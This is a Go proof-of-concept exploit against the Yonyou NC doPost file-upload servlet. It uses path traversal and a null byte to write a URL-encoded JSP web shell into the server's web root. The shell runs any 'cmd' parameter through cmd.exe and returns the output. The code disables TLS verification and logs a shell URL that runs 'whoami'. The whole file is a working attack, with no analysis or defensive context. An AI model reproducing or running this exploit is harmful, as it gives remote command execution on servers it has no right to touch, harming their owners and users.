package poc

import (
	"bytes"
	"crypto/tls"
	"log"
	"net/http"
	"strings"
)

func NCdoPost(target string) {
	url := strings.TrimRight(target, "/")

	filename := RandStringBytes(5)
	request, err := http.NewRequest("POST", url+"/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\"+filename+".jsp%00", bytes.NewBufferString("%3c%25%40%20%70%61%67%65%20%6c%61%6e%67%75%61%67%65%3d%22%6a%61%76%61%22%20%63%6f%6e%74%65%6e%74%54%79%70%65%3d%22%74%65%78%74%2f%68%74%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%22%20%70%61%67%65%45%6e%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%25%3e%0a%3c%25%40%20%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%69%6f%2e%2a%22%25%3e%0a%3c%25%20%6f%75%74%2e%70%72%69%6e%74%28%53%79%73%74%65%6d%2e%67%65%74%50%72%6f%70%65%72%74%79%28%22%6f%73%2e%6e%61%6d%65%22%29%2e%74%6f%4c%6f%77%65%72%43%61%73%65%28%29%29%3b%53%74%72%69%6e%67%20%63%6d%64%20%3d%20%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%3b%69%66%28%63%6d%64%20%21%3d%20%6e%75%6c%6c%29%7b%50%72%6f%63%65%73%73%20%70%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%6e%65%77%20%53%74%72%69%6e%67%5b%5d%7b%22%63%6d%64%2e%65%78%65%22%2c%22%2f%63%22%2c%63%6d%64%7d%29%3b%20%49%6e%70%75%74%53%74%72%65%61%6d%20%69%6e%70%75%74%20%3d%20%70%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%3b%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%20%69%6e%73%20%3d%20%6e%65%77%20%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%69%6e%70%75%74%2c%20%22%47%42%4b%22%29%3b%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%62%72%20%3d%20%6e%65%77%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%69%6e%73%29%3b%6f%75%74%2e%70%72%69%6e%74%28%22%3c%70%72%65%3e%22%29%3b%53%74%72%69%6e%67%20%6c%69%6e%65%3b%77%68%69%6c%65%28%28%6c%69%6e%65%20%3d%20%62%72%2e%72%65%61%64%4c%69%6e%65%28%29%29%20%21%3d%20%6e%75%6c%6c%29%20%7b%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%6c%69%6e%65%29%3b%7d%20%6f%75%74%2e%70%72%69%6e%74%28%22%3c%2f%70%72%65%3e%22%29%3b%62%72%2e%63%6c%6f%73%65%28%29%3b%69%6e%73%2e%63%6c%6f%73%65%28%29%3b%69%6e%70%75%74%2e%63%6c%6f%73%65%28%29%3b%7d%25%3e"))
	if err != nil {
		log.Println("[-] Error creating request:", err)
	}
	request.Header.Set("Content-Type", `application/octet-stream`)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	response, err := client.Do(request)
	if err != nil {
		log.Println("[-] Error sending request:", err)
	}
	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		log.Println("[+] 可能存在用友NC doPost 接口存在任意文件上传，路径：" + url + "/" + filename + ".jsp?cmd=whoami")
	}
}
